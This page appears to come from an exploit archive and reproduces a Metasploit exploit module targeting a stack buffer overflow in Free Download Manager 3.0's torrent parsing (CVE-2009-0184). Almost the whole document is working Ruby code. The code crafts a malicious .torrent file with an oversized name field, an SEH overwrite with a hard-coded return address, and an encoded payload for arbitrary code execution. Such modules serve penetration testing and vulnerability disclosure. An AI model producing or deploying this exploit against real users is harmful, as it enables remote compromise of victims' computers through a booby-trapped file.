Free Download Manager Torrent File Parsing Multiple Remote Buffer Overflow Vulnerabilities
==========================================================================================


# Title: Free Download Manager Torrent File Parsing Multiple Remote Buffer Overflow Vulnerabilities
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Carsten Eiram
# Published: 2009-11-11
# Verified: yes

view source
print?
##
# $Id: fdm_torrent.rb 7455 2009-11-10 21:52:17Z jduck $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
         
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Free Download Manager Torrent Parsing Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in Free Download Manager
                    3.0 Build 844. Arbitrary code execution could occur when parsing a
                    specially crafted torrent file.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => &#039;jduck&#039;,
            &#039;Version&#039;        => &#039;$Revision: 7455 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2009-0184&#039; ],
                    [ &#039;OSVDB&#039;, &#039;54033&#039; ],
                    [ &#039;BID&#039;, &#039;33555&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                },                 
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1024,
                    &#039;DisableNops&#039;   =>  &#039;True&#039;,
                    &#039;BadChars&#039; => "\x00",
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumUpper,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Free Download Manager 3.0 (Build 844)&#039;,
                        {
                            &#039;Ret&#039; => 0x7605112c # pop/pop/ret @ msvcp60.dll
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;February 2 2009&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.torrent&#039;]),
            ], self.class)
    end
 
    def exploit
        x = ""
 
        bof = rand_text_alphanumeric(10004) + generate_seh_payload(target.ret)
        # hit the end of the stack...
        bof << rand_text(20000)
         
        len = rand(10*1024*1024)
        info_hash = {
            &#039;length&#039; => len,
            &#039;name&#039; => bof,
            &#039;piece length&#039; => len + rand(262144 - len),
            &#039;pieces&#039; => rand_text(20),
        }
           
        ann_hash = {
            &#039;info&#039; => info_hash,
        }
           
        encoded = bencode_hash(ann_hash)
         
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(encoded)
         
    end
     
    # bencoding functions:
    #
    # http://wiki.theory.org/BitTorrentSpecification
    #
    def bencode_string(str)
        ret = "%d:" % str.length
        ret << str
        return ret
    end
 
    def bencode_int(int)
        ret = "i%de" % int
        return ret
    end
 
    def bencode_item(item)
        case item
        when Fixnum
            return bencode_int(item)
        when String
            return bencode_string(item)
        when Hash
            return bencode_hash(item)
        else
            throw("unsupported bencode data type! " + item.testzt)
        end
    end
     
    def bencode_list(list)
        ret = "l"
        list.each do |el|
            ret << bencode_item(el)
        end
        ret << "e"
        return ret
    end
 
    def bencode_hash(hash)
        ret = "d"
        hash.keys.sort.each do |k|
            ret << bencode_item(k)
            ret << bencode_item(hash[k])
        end
        ret << "e"
        return ret
    end
     
end



